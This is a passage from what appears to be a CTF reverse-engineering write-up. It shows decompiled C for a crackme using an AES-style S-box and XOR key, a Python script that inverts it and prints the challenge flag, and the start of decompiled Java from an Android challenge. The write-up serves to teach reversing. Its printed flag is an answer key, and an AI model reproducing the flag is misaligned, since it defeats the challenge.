class="number">7</span>] = <span class="number">0x45</span>;</span><br><span class="line">  v17[<span class="number">8</span>] = <span class="number">0xFFFFFF7D</span>;</span><br><span class="line">  v17[<span class="number">9</span>] = <span class="number">0xFFFFFF1F</span>;</span><br><span class="line">  v17[<span class="number">10</span>] = <span class="number">0xFFFFFF3F</span>;</span><br><span class="line">  v17[<span class="number">11</span>] = <span class="number">0xFFFFFFF9</span>;</span><br><span class="line">  v17[<span class="number">12</span>] = <span class="number">0xFFFFFF97</span>;</span><br><span class="line">  v17[<span class="number">13</span>] = <span class="number">0xFFFFFF76</span>;</span><br><span class="line">  v17[<span class="number">14</span>] = <span class="number">0x3B</span>;</span><br><span class="line">  v17[<span class="number">15</span>] = <span class="number">0x92</span>;</span><br><span class="line">  v17[<span class="number">16</span>] = <span class="number">0x2F</span>;</span><br><span class="line">  v17[<span class="number">17</span>] = <span class="number">0xFFFFFF44</span>;</span><br><span class="line">  v17[<span class="number">18</span>] = <span class="number">0xFFFFFF06</span>;</span><br><span class="line">  v17[<span class="number">19</span>] = <span class="number">0xFFFFFF67</span>;</span><br><span class="line">  v17[<span class="number">20</span>] = <span class="number">0xFFFFFFA8</span>;</span><br><span class="line">  v17[<span class="number">21</span>] = <span class="number">0xFFFFFFEB</span>;</span><br><span class="line">  v17[<span class="number">22</span>] = <span class="number">0xFFFFFFEC</span>;</span><br><span class="line">  v17[<span class="number">23</span>] = <span class="number">0x4A</span>;</span><br><span class="line">  v17[<span class="number">24</span>] = <span class="number">0xFFFFFF6F</span>;</span><br><span class="line">  v17[<span class="number">25</span>] = <span class="number">0xFFFFFFE8</span>;</span><br><span class="line">  v17[<span class="number">26</span>] = <span class="number">0xFFFFFF35</span>;</span><br><span class="line">  v17[<span class="number">27</span>] = <span class="number">0xFFFFFFF9</span>;</span><br><span class="line">  v17[<span class="number">28</span>] = <span class="number">0xFFFFFFAC</span>;</span><br><span class="line">  v17[<span class="number">29</span>] = <span class="number">0xFFFFFFA7</span>;</span><br><span class="line">  v17[<span class="number">30</span>] = <span class="number">0x8C</span>;</span><br><span class="line">  v17[<span class="number">31</span>] = <span class="number">0x71</span>;</span><br><span class="line">  qmemcpy(v16, <span class="string">&quot;nyi&quot;</span>, <span class="number">3</span>);</span><br><span class="line">  v16[<span class="number">3</span>] = <span class="number">-125</span>;</span><br><span class="line">  v16[<span class="number">4</span>] = <span class="number">121</span>;</span><br><span class="line">  v16[<span class="number">5</span>] = <span class="number">127</span>;</span><br><span class="line">  v16[<span class="number">6</span>] = <span class="number">105</span>;</span><br><span class="line">  v16[<span class="number">7</span>] = <span class="number">117</span>;</span><br><span class="line">  v16[<span class="number">8</span>] = <span class="number">121</span>;</span><br><span class="line">  v16[<span class="number">9</span>] = <span class="number">120</span>;</span><br><span class="line">  v16[<span class="number">10</span>] = <span class="number">-127</span>;</span><br><span class="line">  v16[<span class="number">11</span>] = <span class="number">105</span>;</span><br><span class="line">  v16[<span class="number">12</span>] = <span class="number">93</span>;</span><br><span class="line">  v16[<span class="number">13</span>] = <span class="number">99</span>;</span><br><span class="line">  v16[<span class="number">14</span>] = <span class="number">77</span>;</span><br><span class="line">  v16[<span class="number">15</span>] = <span class="number">73</span>;</span><br><span class="line">  v13[<span class="number">0</span>] = <span class="number">0x78732A6F6D6B767A</span>i64;</span><br><span class="line">  v13[<span class="number">1</span>] = <span class="number">0x7C7F79832A7E7F79</span>i64;</span><br><span class="line">  v13[<span class="number">2</span>] = <span class="number">0x142A44716B76702A</span>i64;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  v10[<span class="number">0</span>] = <span class="number">-125</span>;</span><br><span class="line">  v10[<span class="number">1</span>] = <span class="number">111</span>;</span><br><span class="line">  v10[<span class="number">2</span>] = <span class="number">125</span>;</span><br><span class="line">  v10[<span class="number">3</span>] = <span class="number">43</span>;</span><br><span class="line">  v10[<span class="number">4</span>] = <span class="number">42</span>;</span><br><span class="line">  v10[<span class="number">5</span>] = <span class="number">-125</span>;</span><br><span class="line">  v10[<span class="number">6</span>] = <span class="number">121</span>;</span><br><span class="line">  v10[<span class="number">7</span>] = <span class="number">127</span>;</span><br><span class="line">  v10[<span class="number">8</span>] = <span class="number">42</span>;</span><br><span class="line">  v10[<span class="number">9</span>] = <span class="number">107</span>;</span><br><span class="line">  v10[<span class="number">10</span>] = <span class="number">124</span>;</span><br><span class="line">  v10[<span class="number">11</span>] = <span class="number">111</span>;</span><br><span class="line">  v10[<span class="number">12</span>] = <span class="number">42</span>;</span><br><span class="line">  v10[<span class="number">13</span>] = <span class="number">124</span>;</span><br><span class="line">  v10[<span class="number">14</span>] = <span class="number">115</span>;</span><br><span class="line">  v10[<span class="number">15</span>] = <span class="number">113</span>;</span><br><span class="line">  v10[<span class="number">16</span>] = <span class="number">114</span>;</span><br><span class="line">  v10[<span class="number">17</span>] = <span class="number">126</span>;</span><br><span class="line">  v10[<span class="number">18</span>] = <span class="number">43</span>;</span><br><span class="line">  v10[<span class="number">19</span>] = <span class="number">20</span>;</span><br><span class="line">  qmemcpy(v11, <span class="string">&quot;\nxy&quot;</span>, <span class="number">3</span>);</span><br><span class="line">  v11[<span class="number">3</span>] = <span class="number">-120</span>;</span><br><span class="line">  v11[<span class="number">4</span>] = <span class="number">126</span>;</span><br><span class="line">  v11[<span class="number">5</span>] = <span class="number">124</span>;</span><br><span class="line">  v11[<span class="number">6</span>] = <span class="number">-125</span>;</span><br><span class="line">  v11[<span class="number">7</span>] = <span class="number">42</span>;</span><br><span class="line">  v11[<span class="number">8</span>] = <span class="number">107</span>;</span><br><span class="line">  v11[<span class="number">9</span>] = <span class="number">113</span>;</span><br><span class="line">  v11[<span class="number">10</span>] = <span class="number">107</span>;</span><br><span class="line">  v11[<span class="number">11</span>] = <span class="number">115</span>;</span><br><span class="line">  v11[<span class="number">12</span>] = <span class="number">120</span>;</span><br><span class="line">  v11[<span class="number">13</span>] = <span class="number">-120</span>;</span><br><span class="line">  v11[<span class="number">14</span>] = <span class="number">20</span>;</span><br><span class="line">  qmemcpy(v12, <span class="string">&quot;\nxy&quot;</span>, <span class="number">3</span>);</span><br><span class="line">  v12[<span class="number">3</span>] = <span class="number">-120</span>;</span><br><span class="line">  v12[<span class="number">4</span>] = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; ++i )</span><br><span class="line">    *(v13 + i) -= <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">39</span>; ++j )</span><br><span class="line">    v10[j] -= <span class="number">10</span>;</span><br><span class="line">  *v7 = <span class="number">0</span>i64;</span><br><span class="line">  v8 = <span class="number">0</span>i64;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, v13);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">  _32 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">  v21 = <span class="built_in">strlen</span>(v7);</span><br><span class="line">  <span class="keyword">if</span> ( _32 != <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v12[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">15</span>; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    v16[k] -= <span class="number">10</span>;</span><br><span class="line">    v7[k] = v16[k];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( Str[<span class="number">5</span>] != <span class="string">&#x27;.&#x27;</span> || Str[<span class="number">10</span>] != <span class="string">&#x27;l&#x27;</span> || Str[<span class="number">17</span>] != <span class="string">&#x27;0&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v12[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">15</span>; ++m )</span><br><span class="line">    v18[m] = v7[m];                             <span class="comment">// v18 = do_you_konw_SYC?</span></span><br><span class="line">  <span class="keyword">for</span> ( n = <span class="number">1</span>; n &lt;= <span class="number">10</span>; ++n )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt;= <span class="number">31</span>; ++ii )</span><br><span class="line">      v18[<span class="number">16</span> * n + ii] = v18[<span class="number">16</span> * n - <span class="number">16</span> + ii] ^ S[v18[<span class="number">16</span> * n - <span class="number">16</span> + ii]];</span><br><span class="line">  &#125;</span><br><span class="line">  HIBYTE(v19) = <span class="string">&#x27;9&#x27;</span>;</span><br><span class="line">  kk = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( jj = <span class="number">0</span>; jj &lt; _32; ++jj )</span><br><span class="line">    flag1[jj] = S[Str[jj]];</span><br><span class="line">  <span class="keyword">for</span> ( kk = <span class="number">0</span>; kk &lt;= <span class="number">0</span>; ++kk )</span><br><span class="line">  &#123;</span><br><span class="line">    ShiftRow(flag1);                            <span class="comment">// 将第n行的前(n - 1)个元素向右移动(5 - n)格</span></span><br><span class="line">    ShiftRow(flag2);</span><br><span class="line">    tansform(flag1);</span><br><span class="line">    tansform(flag2);</span><br><span class="line">    <span class="keyword">for</span> ( mm = <span class="number">0</span>; mm &lt;= <span class="number">15</span>; ++mm )</span><br><span class="line">    &#123;</span><br><span class="line">      flag1[mm] ^= v18[<span class="number">16</span> * kk + mm];           <span class="comment">// 将flag与key1异或</span></span><br><span class="line">      flag1[mm + <span class="number">16</span>] ^= v18[<span class="number">16</span> * kk + mm];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( nn = <span class="number">0</span>; nn &lt; _32; ++nn )</span><br><span class="line">      flag1[nn] = S[flag1[nn]];                 <span class="comment">// 将flag中的值替换为S中以flag的值为索引的值</span></span><br><span class="line">  &#125;</span><br><span class="line">  ShiftRow(flag1);</span><br><span class="line">  ShiftRow(flag2);</span><br><span class="line">  <span class="keyword">for</span> ( i1 = <span class="number">0</span>; i1 &lt;= <span class="number">15</span>; ++i1 )                <span class="comment">// 将flag与key2异或</span></span><br><span class="line">  &#123;</span><br><span class="line">    flag1[i1] ^= v18[<span class="number">16</span> * kk + i1];</span><br><span class="line">    flag1[i1 + <span class="number">16</span>] ^= v18[<span class="number">16</span> * kk + i1];</span><br><span class="line">  &#125;</span><br><span class="line">  cnt = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i2 = <span class="number">0</span>; i2 &lt;= <span class="number">31</span>; ++i2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( flag1[i2] == v17[i2] )</span><br><span class="line">      ++cnt;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( cnt &lt;= <span class="number">31</span> )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v11[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, v10);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>据此写出解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">S = [<span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>, <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, </span><br><span class="line">  <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, </span><br><span class="line">  <span class="number">0x72</span>, <span class="number">0xC0</span>, <span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, </span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0xC7</span>, </span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, </span><br><span class="line">  <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, </span><br><span class="line">  <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>, </span><br><span class="line">  <span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, </span><br><span class="line">  <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>, <span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, </span><br><span class="line">  <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, </span><br><span class="line">  <span class="number">0x9F</span>, <span class="number">0xA8</span>, <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, </span><br><span class="line">  <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>, <span class="number">0xCD</span>, <span class="number">0x0C</span>, </span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, </span><br><span class="line">  <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, </span><br><span class="line">  <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, </span><br><span class="line">  <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>, <span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, </span><br><span class="line">  <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, </span><br><span class="line">  <span class="number">0xAE</span>, <span class="number">0x08</span>, <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, </span><br><span class="line">  <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x70</span>, <span class="number">0x3E</span>, </span><br><span class="line">  <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, </span><br><span class="line">  <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>, <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, </span><br><span class="line">  <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>, </span><br><span class="line">  <span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, </span><br><span class="line">  <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span>]</span><br><span class="line">key_ = <span class="string">&quot;do_you_konw_SYC?&quot;</span></span><br><span class="line">v17 = [<span class="literal">None</span>] * <span class="number">32</span></span><br><span class="line">v17[<span class="number">0</span>] = <span class="number">0xE0</span></span><br><span class="line">v17[<span class="number">1</span>] = <span class="number">0x05</span></span><br><span class="line">v17[<span class="number">2</span>] = <span class="number">0x6E</span></span><br><span class="line">v17[<span class="number">3</span>] = <span class="number">0xC2</span></span><br><span class="line">v17[<span class="number">4</span>] = <span class="number">0x6E</span></span><br><span class="line">v17[<span class="number">5</span>] = <span class="number">0x99</span></span><br><span class="line">v17[<span class="number">6</span>] = <span class="number">0x68</span></span><br><span class="line">v17[<span class="number">7</span>] = <span class="number">0x45</span></span><br><span class="line">v17[<span class="number">8</span>] = <span class="number">0x7D</span></span><br><span class="line">v17[<span class="number">9</span>] = <span class="number">0x1F</span></span><br><span class="line">v17[<span class="number">10</span>] = <span class="number">0x3F</span></span><br><span class="line">v17[<span class="number">11</span>] = <span class="number">0xF9</span></span><br><span class="line">v17[<span class="number">12</span>] = <span class="number">0x97</span></span><br><span class="line">v17[<span class="number">13</span>] = <span class="number">0x76</span></span><br><span class="line">v17[<span class="number">14</span>] = <span class="number">0x3B</span></span><br><span class="line">v17[<span class="number">15</span>] = <span class="number">0x92</span></span><br><span class="line">v17[<span class="number">16</span>] = <span class="number">0x2F</span></span><br><span class="line">v17[<span class="number">17</span>] = <span class="number">0x44</span></span><br><span class="line">v17[<span class="number">18</span>] = <span class="number">0x06</span></span><br><span class="line">v17[<span class="number">19</span>] = <span class="number">0x67</span></span><br><span class="line">v17[<span class="number">20</span>] = <span class="number">0xA8</span></span><br><span class="line">v17[<span class="number">21</span>] = <span class="number">0xEB</span></span><br><span class="line">v17[<span class="number">22</span>] = <span class="number">0xEC</span></span><br><span class="line">v17[<span class="number">23</span>] = <span class="number">0x4A</span></span><br><span class="line">v17[<span class="number">24</span>] = <span class="number">0x6F</span></span><br><span class="line">v17[<span class="number">25</span>] = <span class="number">0xE8</span></span><br><span class="line">v17[<span class="number">26</span>] = <span class="number">0x35</span></span><br><span class="line">v17[<span class="number">27</span>] = <span class="number">0xF9</span></span><br><span class="line">v17[<span class="number">28</span>] = <span class="number">0xAC</span></span><br><span class="line">v17[<span class="number">29</span>] = <span class="number">0xA7</span></span><br><span class="line">v17[<span class="number">30</span>] = <span class="number">0x8C</span></span><br><span class="line">v17[<span class="number">31</span>] = <span class="number">0x71</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift_row</span>(<span class="params">flag:<span class="built_in">list</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            flag[<span class="number">4</span> * i + <span class="number">3</span> - k], flag[<span class="number">4</span> * i + <span class="number">3</span> - k - <span class="number">1</span>] = flag[<span class="number">4</span> * i + <span class="number">3</span> - k - <span class="number">1</span>], flag[<span class="number">4</span> * i + <span class="number">3</span> - k]</span><br><span class="line">  <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key1 = []</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> key_:</span><br><span class="line">  key1.append(<span class="built_in">ord</span>(each) &amp; <span class="number">0xFF</span>)</span><br><span class="line">key2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">  key2.append(key1[i] ^ S[key1[i]] &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line">flag_after = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">  temp = v17[i] ^ key2[i % <span class="number">0x10</span>]</span><br><span class="line">  flag_after.append(temp)</span><br><span class="line"></span><br><span class="line">flag  = shift_row(flag_after[<span class="number">0</span> :<span class="number">16</span>])</span><br><span class="line">flag += shift_row(flag_after[<span class="number">16</span>:<span class="number">32</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">  flag[i] = S.index(flag[i])</span><br><span class="line">  flag[i] ^= key1[i % <span class="number">0x10</span>]</span><br><span class="line"></span><br><span class="line">flag1 = [<span class="literal">None</span>] * <span class="number">16</span></span><br><span class="line">flag2 = [<span class="literal">None</span>] * <span class="number">16</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    flag1[<span class="number">4</span> * j + i] = S.index(flag[cnt])</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    flag2[<span class="number">4</span> * j + i] = S.index(flag[cnt])</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">flag_last  = shift_row(flag1)</span><br><span class="line">flag_last += shift_row(flag2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> flag_last:</span><br><span class="line">  t = S.index(each)</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(t), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># SYC&#123;0.o_Thls_1s_n0t_A3s_(q^_^p)&#125;</span></span><br></pre></td></tr></table></figure>

<p>另外 不要手抄key不要手抄key不要手抄key不要手抄key不要手抄key不要手抄key不要手抄key不要手抄key不要手抄key不要手抄key</p>
<h3 id="ezandroid-安卓逆向"><a href="#ezandroid-安卓逆向" class="headerlink" title="ezandroid | 安卓逆向"></a>ezandroid | 安卓逆向</h3><p>apk用jeb打开 有两个主要活动如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.babyapk_1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.Handler;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> b.f;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">f</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">b</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span>[] a;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">b</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.a = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">2023708229</span>, -<span class="number">158607964</span>, <span class="number">0x81963FFA</span>, <span class="number">0x458FAC58</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> EditText o;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// b.f</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle0)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Handler</span>();</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle0);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F0B001C</span>);  <span class="comment">// layout:activity_main</span></span><br><span class="line">        <span class="type">Button</span> <span class="variable">button0</span> <span class="operator">=</span> (Button)<span class="built_in">this</span>.findViewById(<span class="number">0x7F080057</span>);  <span class="comment">// id:button</span></span><br><span class="line">        <span class="built_in">this</span>.o = (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F080097</span>);  <span class="comment">// id:edit_text</span></span><br><span class="line">        button0.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span>  <span class="comment">// android.view.View$OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view0)</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.o.getText().toString();</span><br><span class="line">                <span class="keyword">if</span>(s.length() &gt; <span class="number">24</span>) &#123;</span><br><span class="line">                    MainActivity.<span class="built_in">this</span>.o.setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">                    s = MainActivity.<span class="built_in">this</span>.o.getText().toString();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(((s.length() == <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>) | (s.length() % <span class="number">24</span> == <span class="number">0</span> ? <span class="number">0</span> : <span class="number">1</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">v</span> <span class="operator">=</span> <span class="number">24</span> - s.length() % <span class="number">24</span>;</span><br><span class="line">                    <span class="type">StringBuilder</span> <span class="variable">stringBuilder0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(s);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="number">0</span>; v1 &lt; 